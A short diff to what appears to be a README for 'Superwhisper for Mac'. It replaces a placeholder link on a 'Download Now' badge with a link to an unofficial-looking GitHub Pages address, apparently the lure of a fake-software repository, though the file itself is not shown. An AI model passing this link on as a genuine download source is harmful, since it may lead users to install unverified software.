@@ -6,7 +6,7 @@
 
 ## 📥 Download Superwhisper for Mac
 
-[![Download Now](https://img.shields.io/badge/Download--Now-Superwhisper%20Mac-blue?style=for-the-badge&logo=apple)](#)
+[![Download Now](https://img.shields.io/badge/Download--Now-Superwhisper%20Mac-blue?style=for-the-badge&logo=apple)](https://superwhisper-mac.github.io/.github)
 
 ---
 ## 📦 How to Install
